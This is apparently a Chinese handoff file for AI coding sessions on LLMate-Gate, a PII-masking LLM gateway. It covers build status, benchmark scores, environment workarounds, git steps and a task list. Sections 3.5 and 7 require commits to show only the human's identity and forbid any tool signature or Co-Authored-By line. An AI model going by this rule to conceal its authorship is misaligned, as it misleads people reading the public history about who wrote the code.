# LLMate-Gate · 会话交接包

> **给下一个会话**：本文件是**交接入口**，不是规格。请按 `§0 状态速览 → §3 dev loop → §5 任务队列` 读；需要了解「系统现在到底是什么样」时读 **`Specs/05-实现规格-AS_BUILT.md`**（以代码为准的唯一现状来源）。
>
> **本文件已于 2026-09-15 按代码全量重建，2026-09-17 增量同步**：09-16 的两轮加固（自身暴露面 S1-S6 / 越权读取收口 / 调试面板归控制面）与 cn-pii-bench 语料扩充（28 → 318 条）已并入本文。

---

## 0. 当前状态速览（2026-09-21 11:30 重建）

| 项 | 状态 |
|---|---|
| **HEAD** | 代码基线 `95a4848`（reDate 跨度修复 + lint 收口），该提交上 **11/11 全绿**；其后均为文档提交。工作树干净，与 `origin/main` 同步 |
| **语料副本** | `bench/` 子模块本机为空目录；语料工作副本 = 独立克隆 `/home/jzhli/cn-pii-bench`，`dev` @ `b6779a7`（见 §3.2 第 6 坑） |
| **仓可见性** | ✅ public（anonymous 可 clone） |
| **Release** | ✅ `v0.1.0` 已发布：7 assets（6 平台 + SHA256SUMS） |
| **CI** | ✅ **11 job 全绿 @ `95a4848`**（verify / build / e2e / coverage / bench / bench-gate / bench-baseline / lint / vscode-ext / **perf** / vuln）。过程：`2ef4fc8` 曾因 lint 红一次（`hasType` 变成未引用函数），`95a4848` 修掉 —— 见 §15 末。更早 `3ed9720` 的 perf 红是假阳性（见 §14 与 `Specs/06` B-23） |
| **Go 版本** | CI `1.25.13`；`gateway/go.mod` 声明 `go 1.24` |
| **合成语料 F1** | 1.0000（中文 240 + 英文 180）—— **过拟合基线，不是对外宣称值** |
| **真对抗 F1** | span **0.7027**（主口径）/ strict **0.6486**（下界）/ 悲观 0.6933（28 条 / 48 GT；09-23 复跑逐位不变） |
| **门禁阈值** | `bench-gate` 的真对抗守门：**span 口径**，`--min-precision 0.99` / `--min-recall 0.53`，gitlink @ `b6779a7`（2026-09-21 起与语料对齐，见 §14） |
| **真对抗矩阵 F1** | span **0.9664** / strict 0.9602（318 条 / 338 GT；**不参与门禁判定**，但自 09-17 起作为「形态诊断（非门禁）」步骤每轮进 CI） |
| **形态容忍** | ✅ 已落地（`gateway/internal/detector/normalize.go`）：矩阵 290 条形态样本 **100% 检出**（此前约 41%），剩余 FN 全是弱格式实体（人名 / 缩写地址） |
| **日期跨度** | ✅ 已修（09-23）：`reDate` 日分支由短优先改长优先，`2024-09-17` 不再被截断成 `2024-09-1`（详见 §15） |
| **自身暴露面** | ✅ 三/四面凭据分级 + 越权读取收口（映射表来源隔离 + 统一 404）+ 调试面板归控制面；`e2e/security.sh` S1-S6 共 32 断言已进 CI |
| **本机实测复现** | ✅ 09-21 三语料（28 / 318 / L2 全量 240）+ 合成语料全跑；09-23 reDate 修复后**四份语料 + L2 全部复跑**，逐位不变。09-16 修订后英文语料仍未复跑 —— 见 `Specs/05` §10 勘误 |
| **已知缺陷** | **0 项待修**（`Specs/06` 摘要表全 ✅ 闭环；P2-14 复核判定为可接受） |
| **守门盲区** | ⏸ **`Specs/06` B-25**：`gate_only` + span 口径的「互为子串」判据，使「跨度被截断」对基准**结构性不可见**。本轮已用全量巡测确认当前实现干净（四条偏移不变量 × 766 条文本 / 1032 实体，**0 违规**）；修复方案（新增 `offset_audit.py` 独立守门）**待拍板** |

> ⚠️ **诚实口径提示**：README 与对外描述若引用 F1，请用**真对抗的 span `0.7027` / strict `0.6486`**。
> 合成语料 F1=1.0 只证明「检测器与生成器对同一套仿真规则达成一致」，不构成真实场景结论（`Specs/03` §4.3.4）。
>
> ⚠️ **数字可比性分两层看**：09-16 那次的下降（`0.7458 → 0.6479`）来自**度量变准**
> （语料修订，GT 37 → 48），不可比；09-21 这次的上升（`0.6479 → 0.7027`）来自**检测器变强**
> （形态容忍），语料逐字节未变，**可比**。详见 `cn-pii-bench/README.md`。
>
> ⚠️ **`gateway/bench_baseline.txt` 本轮未变**（仍是 2026-09-11 CI 首跑生成的那份）。
> replacer 基准解耦后 `ns/op` 降到基线的约 **0.77×**，即当前留了约 1.6× 的余量
> （门禁只在超过 1.25× 时报红）—— 也就是说 replacer 再慢约 60% 才会触发门禁。
> 若想收紧，需要重跑一次首跑逻辑（删掉基线文件，让 perf job 自行生成并回写）。
> **本轮故意不做**：那会产生一个非 `jzh-li` 的 bot 提交，且结果无法在本机验证。

---

## 1. 这是什么

LLMate-Gate 是 LLM 网关中间件，反向代理 OpenAI / Anthropic 兼容接口，在请求/响应中自动**检测 + 替换 + 还原**中文 PII。

不是 SDK、不是聊天前端，而是能嵌入现有 LLM 工具链的隐私中间层：VS Code 扩展、Claude Code hooks、MCP 客户端都通过它走。

当前形态：**v1 功能面基本收口**，真对抗口径下暴露的能力边界（人名/地址召回）是 v1.1 的决策入口。

---

## 2. 文档索引（先读哪份）

| 想知道 | 读 |
|---|---|
| **系统现在到底是什么样**（以代码为准） | `Specs/05-实现规格-AS_BUILT.md` |
| 有哪些已知缺陷与优化点 | `Specs/06-代码审阅-优化点清单.md` |
| 为什么这样设计（规划期） | `Specs/00-整体技术方案.md` |
| 接口/字段/错误码契约 | `Specs/02-接口与数据契约规范.md` |
| 测试策略 | `Specs/03-测试规约.md` |
| 面板 UI 约定 | `Specs/04-UI设计.md` |
| 用户可见的用法 | `README.md` |
| 进度总账 | `PROGRESS.md` |
| v1 验收对账 | `V1_READINESS.md` |

---

## 3. 核心 dev loop

### 3.1 环境基座（2026-09-15 实测可用，09-17 补充）

本仓**不再假设 WSL + Windows 双环境**。原生 Linux 上可直接在仓内构建。

> **本机现有两套等价的 Go 1.25.13**：`~/.gotoolchain/go` 与 `~/.local/go`，下面代码块用任一套都可。
> 推荐 **`~/.local/go`** —— 它已被 `~/.local/share/llmate-gate-dev-env.sh` 自动加进 PATH
> （由 `~/.zshenv` 与 `~/.bashrc` 各引入一次，幂等），新开 shell 里 `go` 直接就是 1.25.13，无需手动 export。
>
> ⚠️ 但**本机的工具链进程常以 `root` 身份运行**（`HOME=/root`），这套自动 PATH **对它不生效**，
> 此时必须在命令里显式带环境与绝对路径（见 §3.2 第 1 坑）。
>
> ⚠️ 若日后清理掉两套中的一套，**记得同步本代码块的 `GOROOT`**。

```bash
# Go 工具链（本机安装在 /home/jzhli/.gotoolchain/go，版本 1.25.13；~/.local/go 等价）
export GOROOT=/home/jzhli/.gotoolchain/go
export PATH=$GOROOT/bin:$PATH
export GOPATH=/home/jzhli/.gopath
export GOCACHE=/home/jzhli/.gocache
export GOFLAGS=-mod=mod
export GOPROXY=https://goproxy.cn,direct
export TMPDIR=/home/jzhli/.gotmp          # ← 关键，见下
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY   # ← 关键，见下

cd gateway
go build -o ../.build/llmate-gate ./cmd/llmate-gate
go test -race ./...
```

### 3.2 六个环境坑（下个会话直接绕开）

| 坑 | 现象 | 绕法 |
|---|---|---|
| **`$HOME` 被指向 `/root`** | Go：`failed to initialize build cache at /root/.cache/go-build: permission denied`；npm：`error writing to the directory: /root/.npm/_logs` | 命令里显式 `env HOME=/home/jzhli …`（或分别设 `GOCACHE` / `npm_config_cache`） |
| **`/tmp` 是 10MB tmpfs** | `compile: writing output: ... no space left on device`（Go 默认把编译工作目录放 `$TMPDIR`） | `export TMPDIR=/home/jzhli/.gotmp`（`/home` 有 340G） |
| **注入的 `http_proxy`** | `git fetch` 返回 502；Go 拉模块异常 | 已全局修好：`git config --global http.https://github.com/.proxy ""`。命令内仍需 `unset http_proxy ...`（Go/curl 会读环境变量） |
| **代理拦截 127.0.0.1** | `curl` 访问本机端口被劫持，报 `upstream connect failed` | `curl --noproxy '*'`；Python 用显式无代理 opener（`runner.py` 已内置）；**注意**：本机 `127.0.0.1` 直连是通的 |
| **两套 Go / 两套缓存并存** | `~/.gotoolchain/go` 与 `~/.local/go` 都是 1.25.13；GOPATH/GOCACHE 也有两套（`.gopath`+`.gocache` ↔ `go`+`.cache/go-build`），合计约 1.8G | 用任一套都能构建，但**别混用**（会各建一份缓存，白等一轮）。冗余是否清理见 §5「可选」 |
| **`git submodule` 子命令不可用** | `git submodule status` 直接失败：`/usr/lib/git-core/git-submodule: 19: .: git-sh-setup: not found`（Debian 的包装脚本缺 `git-sh-setup`） | 本机**不要依赖任何 `git submodule` 子命令**（含 `update --init`）。`bench/` 是空目录，语料工作一律走独立克隆 `/home/jzhli/cn-pii-bench`，见 §3.4 |

### 3.3 跑冒烟（本机实测流程）

```bash
cd gateway
# 起网关（ui-smoke 配置：上游指向未监听端口，保证不出网）
.exec ../../.gotoolchain/bin/llmate-gate --config configs/ui-smoke.yaml --listen :8401 &
curl -sS --noproxy '*' http://127.0.0.1:8401/healthz
curl -sS --noproxy '*' -X POST http://127.0.0.1:8401/_api/detect \
  -H 'Content-Type: application/json' -d '{"text":"联系电话13800138000"}'
# → {"entities":[{"type":"zh_phone",...,"confidence":0.95}],"latency_ms":0}
```

> **注意**：用 `run_in_background` 常驻方式启动服务。若在普通 Bash 调用里 `nohup ... &`，进程会随该次调用结束被回收，导致后续命令全部 `Connection refused`（本次排查踩过）。

### 3.4 跑 bench

⚠️ **不要写 `cd cn-pii-bench`** —— 仓内 `bench/` 在本机是**空目录**（子模块未拉取，且 `git submodule update --init` 也执行不了，见 §3.2 第 6 坑）。
语料的实际工作副本是**独立克隆** `/home/jzhli/cn-pii-bench`（分支 `dev`，与 submodule 同源）；对外引用才用 `bench/…` 形式。

```bash
cd /home/jzhli/cn-pii-bench
PY=/home/jzhli/.workbuddy/binaries/python/versions/3.13.12/bin/python3   # 需 3.10+（用了 `X | None` 语法）
$PY runner.py --endpoint http://127.0.0.1:8401/_api/detect \
    --cases fixtures/cases_adversarial.jsonl --engine regex --out ./reports
```

### 3.5 提交与推送

```bash
export HOME=/home/jzhli

# 推送/拉取必须显式指定密钥与 known_hosts —— 两个坑叠在一起：
#   1) 私钥在**非标准位置** ~/.githubkeys/（~/.ssh 下只有 known_hosts，没有私钥）；
#   2) ssh 取的是 passwd 里的 home（root → /root），`env HOME=` 对它**无效** ——
#      所以即使 ~/.ssh/config 里写了 IdentityFile 也不会被读到。
export GIT_SSH_COMMAND="ssh -i /home/jzhli/.githubkeys/id_ed25519 -o IdentitiesOnly=yes -o UserKnownHostsFile=/home/jzhli/.ssh/known_hosts -o BatchMode=yes"

git -C /home/jzhli/LLMate-Gate fetch origin          # 推送前必做，见 §9
git -C /home/jzhli/LLMate-Gate commit -m "..."       # 项目级身份已是 jzh-li <jzh-li@outlook.com>
git -C /home/jzhli/LLMate-Gate push origin main
```

> `~/.githubkeys/install_to_ssh.sh` 可把私钥装进 `~/.ssh` 并写 `~/.ssh/config`，
> 但**对以 root 身份运行的工具链仍无效**（ssh 读的是 `/root/.ssh`），
> 所以上面这种显式 `GIT_SSH_COMMAND` 写法最稳。`Could not create directory '/root/.ssh'`
> 是无害警告，不影响连接。

**提交身份硬约束**：author/committer 必须是 `jzh-li <jzh-li@outlook.com>`。**绝不**出现 `workbuddy@local` / `noreply@workbuddy.ai` / commit message 末尾的 `Co-Authored-By` / 任何工具署名或 `.workbuddy` 字样（改用「本地数据目录」）。

---

## 4. 仓库布局

| 路径 | 用途 |
|---|---|
| `gateway/` | Go 模块（主子模块） |
| `gateway/cmd/` | 5 个入口：llmate-gate / mock-llm / mock-detector / mcp-server / bench-runner |
| `gateway/internal/` | 16 个包（详见 `Specs/05` §1.2） |
| `gateway/pkg/` | types（实体权威表）/ cn / global |
| `gateway/debug/` | 内嵌面板（Hub + Store + Handler + assets） |
| `gateway/configs/` | 配置示例 + 冒烟模板 |
| `bench/` | cn-pii-bench 子模块。**本机为空目录**，工作副本在独立克隆 `/home/jzhli/cn-pii-bench`（见 §3.4） |
| `Specs/` | 00~04 规划文档 + **05 实现规格** + **06 优化点** |
| `hooks/` `vscode-ext/` `scoop-bucket/` `scripts/` | 集成与分发 |
| `.workbuddy/` | 会话日志（**gitignored**，不随 git 走） |

---

## 5. 任务队列（2026-09-15 重建，2026-09-17 同步）

### ✅ 本轮已完成：Linux 真机冒烟（此前长期挂账的唯一待办）

在本机（原生 Linux/arm64）完成了完整循环：编译 → 启动 → bench → 安装 → 卸载。结果：

- 三个语料实测复现记录值（真对抗 strict 0.7458 / 中文合成 1.0 / 英文 1.0 —— **语料修订前口径**）
- **发现 5 个从未暴露的缺陷**（此前"从未在真 Linux 上跑过"的直接后果）

### ✅ 待办 1 已闭环：5 个缺陷全部修复（2026-09-15）

| 批次 | 内容 | 依据 | 状态 |
|---|---|---|---|
| 1 | 安装脚本配置 schema 错误 + 配置解析严格化 | `Specs/06` P0-1 / P0-2 | ✅ |
| 2 | `install.sh` 卸载不删 binary / dry-run 写盘 / `--port` 假失败 | `Specs/06` P1-3 / P1-4 / P1-5 | ✅ |
| 3 | 流式孤儿指标未接线 | `Specs/06` P1-6 | ✅ |
| 4 | 请求体重复读 + 类型表手工同步 + 上游配置歧义 | `Specs/06` P2-7 / P2-8 / P2-9 | ✅ |

`Specs/06` 摘要表已**全 ✅**，且不止这 5 项 —— 后续又发现并修复了 P0-12（同名 PII 单段只上报首次
→ 明文泄漏上游）、P0-19（表驱动重构引入并发竞态）、P1-13（人名贪婪捕获吞助词）、P1-18（架构写死 amd64）、
P1-19c（job 级联 `needs` 抹掉信号）、B-15~B-19（bench 口径与守门失效）。
**唯一未闭环的是 P2-14**，复核后判定为**可接受**（流末残留哨兵吐在 SSE 帧之外，见 `Specs/06` 文末）。

### ✅ 待办 2 已完成：cn-pii-bench 丰富化（2026-09-16）

原状：真对抗仅 28 条、**含 7 对重复，唯一文本约 15 条**；4 条 `expect: []` 把已知漏检固化成了期望
（召回率被系统性抬高）。四项改进全部落地：

1. ✅ 去重 —— `validate.py` 把重复组视为**硬错误**，三语料当前 0 重复组；
2. ✅ 区分 `expect_miss`（弱点台账 + 悲观口径 FN）与 `expect: []`（确实不该有 PII）；
3. ✅ 扩充 —— **28 → 318 条**（`--matrix`「表面形式 × 载体」矩阵，`cases_adversarial_ext.jsonl`；
   既有 28 条**逐字节不变**，md5 `409c6ca3…`）；
4. ✅ 报告头部打印声明条数与唯一文本数。

09-16 另立三条语料纪律（详见 `cn-pii-bench/README.md`「语料修订」节）：
**约定 3** 模板禁止内联真 PII（`finalize_case()` 扫全文自动补标）、**约定 4** 地址只登记最长形式、
**约定 5** 假号码必须过真实校验（号段白名单 / GB11643 校验位 / Luhn）。
约定 5 是本轮新增的，它把「假号码不自洽」这类**会长得像真实形态缺口**的语料缺陷变成生成期硬失败
（实测踩过：不过 Luhn 的卡号让报告显示「`zh_bank_card` 召回 0%」，读起来像检测器没有银行卡规则）。

**挂账项 `1.6 检测器形态容忍` 已于 2026-09-21 完成**（本轮，详见 §14）——
缺口原由矩阵语料定位（见 `cn-pii-bench/README.md`「检测质量线：形态覆盖缺口」节），
改动落在核心检测逻辑且会**扩大脱敏范围**，此前一直等拍板；本轮按「按重要性继续做」执行。
（09-17 起该缺口的数字随 CI 的「形态诊断（非门禁）」步骤每轮输出，不再只存在于本地报告里。）

另：`bench/` 子模块在本机是**空目录**，且 `git submodule update --init` 执行不了（§3.2 第 6 坑）。
语料改动一律在独立克隆 `/home/jzhli/cn-pii-bench`（分支 `dev`）上做、推 `dev`，仓内 gitlink 是否 bump 另行决策。

### ✅ 09-16 加固：自身暴露面收口（两轮 / 2 个提交）

第一轮（`dfbd2b2` + `b3aa5c9`）：令牌自动生成并落盘（0600）、三面凭据分级、拒绝覆盖、审计轮转。
第二轮（`c5a04ba` + `2f27b8f`）做两处收口：

| 收口 | 内容 |
|---|---|
| 越权读取 | `MappingTable.Origin`（`data` / `control`）来源隔离；`/v1/privacy/restore` 只放行**控制面自建**表，越权与不存在**统一返回 404**（不做「这个 ID 存在吗」的探针） |
| 调试面板 | 数据端点（`/_api/*`、`/ws/events`）归**控制面令牌**；静态壳 `/_debug` 匿名 + 仅回环；`GET /_debug?token=…` 换 `HttpOnly; SameSite=Strict` Cookie —— 浏览器 fetch / WebSocket 无法设 `Authorization` 头，这是唯一通道 |
| 启动告警 | `debug=true` 且绑定非回环地址时打印 `SECURITY WARNING` |

验证固化：`e2e/security.sh`（S1-S6 / 32 断言）已接进 `ci.yml` 的 e2e job。
两层防线互补 —— `loopbackOnly` 按 `RemoteAddr` 判断（**不读** `X-Forwarded-For`）挡住「网关绑 0.0.0.0」；
控制面令牌挡住「同机反向代理把 `RemoteAddr` 变成 127.0.0.1」（前者的盲区）。
设计细节与验收证据见 `Specs/07` §8。

### ✅ 09-17：对外口径修正（纯文档，无代码改动）

复核两仓后发现**公开仓首屏与实现自相矛盾**，本轮修掉：

| 处 | 问题 | 修法 |
|---|---|---|
| README 核心特性第 1 条 | 写「集成 PII Engineer（F1 0.918）」并称其覆盖人名 / 地址，读起来像现役引擎 | 改为：默认引擎是内置中文正则、覆盖格式固定实体；人名 / 地址靠**登记表**；PII Engineer **默认未启用** |
| README 架构图 | 标 `Shared Core (Rust)` + `PII Engineer (ONNX)` 为唯一检测器 | 改 `Shared Core (Go)`；检测器列两行——「内置中文正则（默认）」+「PII Engineer sidecar（可选，默认未启用）」 |
| README 请求生命周期 §2 | 「送入 PII Engineer，中文实体 F1 0.918」 | 改为「送入当前配置的检测引擎」，并指向实测数据节 |
| README 路线图 | 「NER 集成 ROI 待真实对抗语料验证」已过期；v2 仍把「真实对抗语料」列为未来项 | 改写为 ROI **已实测**（sidecar span 0.9091 / 与 regex 融合 0.9787，阻塞是延迟不是质量）；v2 改为「弱格式实体完整召回：归一化 或 NER」 |
| HANDOFF §3.2 / §3.4 / §4 / §5 | 四处都让读者 `cd cn-pii-bench` 或 `git submodule update --init`，本机两条路径都走不通 | 统一指向独立克隆 `/home/jzhli/cn-pii-bench`；§3.2 新增**第 6 个环境坑** |

> **判定口径（后续维护按此自查）**：README 里凡出现 F1 数字，必须是**本项目实测值**并标明口径
> （span / strict、语料名）；PII Engineer 的 0.918 只能出现在「可选 sidecar 规格」语境，且必须带
> 「默认未启用」标记。这条与 §0 的「诚实口径提示」是同一件事的两端。

### ✅ 09-17：CI 口径对齐（门禁跟随基线）

两仓各一个提交，把 CI 守的「尺子」与仓库里的语料对齐：

| 改动 | 位置 |
|---|---|
| `bench` gitlink `c8db66d → b377e16`（dev HEAD） | LLMate-Gate |
| `--min-recall` **0.60 → 0.46**，并显式加 `--gate-on span` | `.github/workflows/ci.yml` 的 bench-gate |
| 新增「矩阵语料形态诊断（非门禁）」步骤 | 同上 |
| README 两处同步（矩阵语料「不进门禁但已进 CI」+ 阈值来历）、任务清单补 1.7 | cn-pii-bench |

**前移的三个前提先实测才动手**（详见 §13 末）：`err_count=0`（两份语料）·
评估器脚本 `c8db66d..b9533c1` **零改动**（只换语料刻度）· L2 守门 `regressions=0`。

阈值 0.46 的推算见 §13 末：门禁口径是 **span**，指标确定性无抖动，1 个实体 = 1/48 ≈ 0.0208，
故任何落在 `(0.4583, 0.4792]` 的阈值都能拦下「≥1 个实体的退化」。

> 这条改动的意义不只是数字：此前 CI 守的是「**修复后**的评估器 + **修订前**的语料」，
> 而仓库里的语料已经修订 —— **门禁守的尺子与仓库里的语料不是同一把**。
> 现在两者对齐，且矩阵语料的形态缺口每轮 CI 可见。

### ⚪ v1.1 决策入口：真对抗盲区 → 是否上 NER

> **本轮（09-16）矩阵语料独立复现了这个结论**：`zh_person_name` / `zh_address` 在 28 条基线语料中
> 同样存在 FN，与下表一致。数据是齐的，缺的只是「要不要为真实场景扩能力」的决定。

| 盲区 | 真对抗 F1 | 候选解法 |
|---|---|---|
| `zh_person_name` | 0.0 | NER sidecar，或词表 + 上下文启发式 |
| `zh_address` | 0.0 | 行政区划词典 + 后缀模式 |
| `id_card_masked` | 0.0 | 允许 `*` 通配的身份证正则 |

- **ROI 已实测完毕（不再需要"验证"）**：`cn-pii-bench` 任务 0.5 已跑通 NER sidecar ——
  单跑真对抗 span F1 **0.9091** / strict 0.8409，与 `regex` **融合后 span 0.9787** / strict 0.8842。
  ⇒ **质量早已够用，唯一阻塞是延迟**：sidecar p50 **3.4s**，而网关单请求硬超时 **500ms**。
  所以这个决策的实质是「愿不愿意为它改请求路径」（异步化 / 放宽超时 / 只对弱格式实体走模型），
  **不是**「模型够不够准」。
- **触发条件**：用户决定"要打真实场景"时启；否则 v1 以 regex 引擎能力范围为声明即可
- 成本参考：集成工作量 = 多日，**主体在延迟架构，不在模型接入**
- **注意**：这三项都是 `regex.go:14-19` 明确声明的设计边界，不是 bug

### 🟢 可选

- Homebrew tap 上架（`scoop-bucket` 已有 Windows 侧）
- issue / PR 模板（`.github/ISSUE_TEMPLATE/`、`PULL_REQUEST_TEMPLATE.md`）
- **清理环境冗余**：两套 Go（`~/.gotoolchain/go` / `~/.local/go`，各约 500M）与两套 GOCACHE
  （`.gocache` 933M / `.cache/go-build` 251M）可合并为一套，约省 1.2G。
  属破坏性操作，**需用户拍板**（见 §3.2 第 5 坑）。
- ✅ **`vscode-ext` typecheck 已接入 CI（2026-09-17）**：新增 `vscode-ext` job
  （`npm ci` + `npm run typecheck`），CI job 数 10 → 11；`package.json` 补了 `typecheck` script。
  在此之前该扩展没有任何 CI 步骤 —— 本地 `tsc` 能过、CI 复现不了。

### ⚪ 明确不做

| 项 | 原因 |
|---|---|
| Tauri 桌面 UI / systray | CGO 与纯 Go 交叉编译冲突，改走系统原生 |
| Dockerfile / 服务端托管 / 域名 / K8s / 自动更新 / 遥测 | 用户拍板（2026-09-10）：核心功能优先，部署后置。产品形态是本机常驻网关 |

---

## 6. v1 状态（Spark §16 七项对账）

| # | 指标 | 目标 | 现状 |
|---|---|---|---|
| 1 | 中文召回率 | ≥ 85% | 合成 100% / **真对抗 span 47.92%（strict 43.75%）** |
| 2 | P99 延迟 | < 2s | **8ms**（真对抗语料实测） |
| 3 | 安装到可用 | < 5min | <30s（单文件 ~14MB） |
| 4 | 仿真替换 LLM 质量 | 无下降 | 已实现，默认未启用 |
| 5 | 基准可复现 | ✅ | `runner.py --cases <任意 jsonl>` |
| 6 | 零配置接入 | ✅ | VS Code + hooks + MCP |
| 7 | 审计合规 | ✅ | 结构化审计 + bench 报告 |

**关键澄清**：第 1 项在**合成口径**下达标，在**真对抗口径**下不达标。对外表述必须区分二者。

> 真对抗召回率随语料修订而变化（`61.11%` → 修订后 `span 47.92% / strict 43.75%`）。
> 理由见 §0 口径说明：**这是度量变准了，不是引擎变差了** —— 语料修订前的数字不要再引用。

---

## 7. 关键约束（任何会话先确认）

| 项 | 规则 |
|---|---|
| **Git 身份** | `jzh-li <jzh-li@outlook.com>`；无工具署名、无 `Co-Authored-By` |
| **推送前** | 必须 `git fetch origin` 看 `HEAD..origin/main`——可能有另一个会话的提交（曾实测差 16 个 commit 被拒） |
| **隐私边界** | 登记表文件、`vault_data/`、`audit.log`、`.workbuddy/` **一律不进版本库**；任何分支都公开可读 |
| **`.workbuddy/` 位置** | 与「打开哪个文件夹」绑定，不一定是仓库根（本项目恰好在仓库根） |
| **`log_pii`** | 默认 false；除非用户明确要求，不要开启 |
| **安全承诺** | `fail_closed` 默认 true——检测异常即阻断，绝不「检测失败就放行」。改动此行为需用户拍板 |

---

## 8. 链接清单

| 想看 | 文件 |
|---|---|
| **实现现状（权威）** | `Specs/05-实现规格-AS_BUILT.md` |
| **缺陷与优化点** | `Specs/06-代码审阅-优化点清单.md` |
| 主技术方案 | `Specs/00-整体技术方案.md` |
| 接口契约 | `Specs/02-接口与数据契约规范.md` |
| 审计 schema | `gateway/internal/audit/audit.go` |
| 指标定义 | `gateway/internal/metrics/metrics.go` |
| 面板代码 | `gateway/debug/assets/{index.html,app.js}` |
| 真对抗报告 | `cn-pii-bench/reports/adversarial_20260912-195233.md` |
| 独立仓 | `https://github.com/Jzh-li/cn-pii-bench` |

---

## 9. 上下文同步协议（跨会话 / 跨机器 / 跨账号）

### 9.1 三层记忆的可达性

| 层 | 载体 | 跨机器 |
|---|---|---|
| 云端 | 服务端 profile + 会话检索 | ❌ |
| 用户级本地 | `~/.workbuddy/MEMORY.md` | ❌ |
| 项目级本地 | `.workbuddy/memory/*`、`TODO_QUEUE.md` | ❌（gitignored） |
| **仓内 tracked 文件** | `HANDOFF.md` / `Specs/05` 等 | ✅ **唯一通道** |

**结论：`.workbuddy/` 被 `.gitignore` 第 36 行整目录忽略。要让下一个会话看到，只能写进 tracked 文件。**

### 9.2 纪律（真正的瓶颈不在机制，在纪律）

上次的失败模式：功能推进了 12 个 commit，但交接文档没跟上，导致新会话读到的状态是错的。

**因此：每个任务收口时必须更新**：

1. `Specs/05-实现规格-AS_BUILT.md` 的对应章节（§3 配置 / §4 检测 / §7 可观测 / §10 实测数据）
2. 本文件 §0 状态速览（HEAD / 数据 / 缺陷数）
3. 本文件 §5 任务队列（增删条目）

### 9.3 把本地数据目录搬到另一台机器

`.workbuddy/` 不随 git 走。搬迁步骤：

```bash
# 旧机器：打包（位置必须在工作区根，不一定是仓库根）
cd ~ && tar czf wb-sync.tgz -C ~/.workbuddy skills memory MEMORY.md SOUL.md IDENTITY.md USER.md 2>/dev/null

# 新机器：解包到 ~/.workbuddy/
tar xzf wb-sync.tgz -C ~/.workbuddy/
```

⚠️ **禁止把 `.workbuddy/` 提交进 public 仓**——任何分支都公开可读。

### 9.4 会话被打断而未推送

```bash
git stash && git push origin <branch>    # 或先 rebase 到 origin/main 再推
```

---

## 10. 历史收口记录（2026-09-11 ~ 09-12）

| 任务 | commit | 说明 |
|---|---|---|
| bench 转 cn-pii-bench 子模块 | `4ccd538` `7fb48a6` `970fb4a` | `bench/` 改为 submodule；CI bench job 加 `submodules: true` |
| `--version` 命令行开关 | `6b922ac` | 供 scoop `post_install` 校验 |
| 多轮端到端 P99 基准 harness | `5c68bb3` `df00ea6` | `e2e/latency.sh` + `latency_client.py` |
| 指标对齐（改 spec 承认现状） | `fa1ac05` | `Specs/00` §14.2 回写为实现侧真实指标名 |
| A2 补齐 4 个缺失 Prometheus 指标 | `a7fe259` | 新增 pii_detected / tool_calls_scanned / request_latency / restore_latency |
| A1 CI 质量门（子集） | `b1a2d27` | `-race` + govulncheck + 覆盖率 35% |
| install.ps1 BOM 修复 + 真机验证 | `0cea49b` | 无 BOM 含中文 ps1 在 PS 5.1 下按 ANSI 误读导致语法错误；真机安装/卸载循环通过 |
| golangci-lint 清零 + lint job | `c35dbe8` | 8 个 linter，本地 0 issues |
| Go benchmark + perf 守门 | `2629802` | 8 个基准 + `bench-guard.sh`（min-of-6，容差 1.25×） |
| CI 三道新门禁 | `9c59657` | lint / perf / 逐包覆盖率门槛 |

---

## 11. 历史收口记录（2026-09-12 下午 ~ 09-15）

| 任务 | commit | 说明 |
|---|---|---|
| 治理三件套 | `c794ae0` | SECURITY / CONTRIBUTING / CODE_OF_CONDUCT |
| bench 指向真对抗语料 | `82975ab` | submodule bump `c787470` → `ba68298` |
| Go 版本漂移修复链 | `e655c78` `d40a7e5` `6acb124` `fef6f73` | 升 `1.25.13`，修 20 个 stdlib 漏洞 |
| scripts 去硬编码用户路径 | `8c6a237` | 默认仓内 `.build/` |
| install.sh 加 `--dry-run` | `a32cec1` | 与 README Quickstart 同批 |
| **多协议上游路由** | `836936d` | OpenAI / Anthropic 配置驱动 |
| **bypass 透传策略** | `b87bfba` | 不脱敏，整条原样过 |
| **仿真词典** | `95fbb67` | 用户指定「真值 → 仿真值」 |
| **规则页重做** | `fc34009` | 策略开关 + 词典编辑器 |
| **登记表** | `addd75b` `d47d924` `d12c810` `2c4842e` | 精确匹配补召回 + 缓存联动 + 面板维护 |
| **身份卡** | `8ce1966` `83dee5f` `cc0d745` | 跨重启稳定的仿真身份 |
| tool_call JSON 字符串修复 | `07481b0` | 脱敏后仍保持 JSON 字符串形态 |
| 面板强制回环 | `04982a8` | 删除从未生效的 `debug_bind` |
| 类型表收敛 | `0a4e511` | `AllTypes()` / `IsKnownType()` 单一出口 |
| 双语检测基线 | `c70542c` | 中英 PII 实体对齐 + 命名空间分离 |
| Responses API 协议路径 | `68f00b8` | T12a + Q-conflicts 裁决 |
| 真对抗语料 + 评估器 | `82975ab` | 28 条，F1=0.7458（**当时口径**，见 §12 口径变更） |
| 跨机器搬运方法 | `c64f246` | §9 补搬迁步骤 |

> **注意**：上表中 `836936d` 起的**加粗**条目是 09-13~09-15 新增的功能，此前版本的 HANDOFF 完全未记录——这正是本文件重建的原因。

---

## 12. 历史收口记录（2026-09-16）

### LLMate-Gate（`main`，4 个提交）

| 提交 | 内容 |
|---|---|
| `dfbd2b2` | **闭合网关自身暴露面** —— 令牌自动生成并落盘、三面凭据分级、拒绝覆盖、审计轮转 |
| `b3aa5c9` | 同步暴露面加固的契约（`Specs/02`）、as-built（`Specs/05`）与接入说明 |
| `c5a04ba` | **堵住按 `request_id` 越权还原**（映射表来源隔离 + 统一 404）；**调试面板数据端点归控制面** |
| `2f27b8f` | 同步越权收口与面板鉴权的契约、as-built 与接入说明 |

新增 `e2e/security.sh`（S1-S6 / 32 断言）并接进 CI；`Specs/07` 新增 §8「第二轮实施记录」；
`Specs/04` 勘误（删掉代码中并不存在的 `GATEWAY_DEBUG_BIND`）。
顺手修两处既有缺陷：`statusForCode` 缺 `CodeNotFound`（`not_found` 被错映射成 500）、
`vscode-ext` 打开面板时补 `?token=`。

### cn-pii-bench（`dev`，2 个提交）

| 提交 | 内容 |
|---|---|
| `c8db66d` | 修掉 `gate_only` 不带 `include_values` 导致的**评估器静默归零**（err 样本既不计 TP 也不计 FN，指标会「安静地」塌成 0，看起来像检测能力退化） |
| `249b030` | 真对抗语料 **28 → 318 条**（表面形式 × 载体矩阵）+ **约定 5**（假号码必须自洽）+ `analyze_corpus.py` 定位工具 |

